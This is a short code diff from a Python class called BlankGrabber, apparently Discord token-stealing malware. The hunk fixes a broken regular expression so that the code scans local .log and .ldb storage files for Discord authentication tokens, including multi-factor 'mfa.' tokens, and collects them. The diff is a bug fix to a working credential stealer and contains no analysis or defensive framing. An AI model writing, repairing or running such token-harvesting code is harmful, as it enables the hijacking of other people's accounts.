@@ -198,7 +198,7 @@ class BlankGrabber:
                 if not filename.endswith('.log') and not filename.endswith('.ldb'):
                     continue
                 for line in [x.strip() for x in open(f'{path}/{filename}', errors='ignore').readlines() if x.strip()]:
-                    for reg in (r"[\w-]{`24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                    for reg in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                         for token in re.findall(reg, line):
                             if not token in self.tokens:
                                 self.tokens.append(token)
